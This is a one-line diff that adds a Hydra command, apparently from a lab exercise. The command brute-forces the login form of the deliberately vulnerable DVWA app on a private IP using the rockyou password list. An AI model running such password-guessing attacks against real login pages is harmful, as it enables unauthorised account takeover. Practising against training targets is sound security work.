@@ -1,0 +1,1 @@
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed" -V -f -t 4 -o hydra_dvwa_login.txt
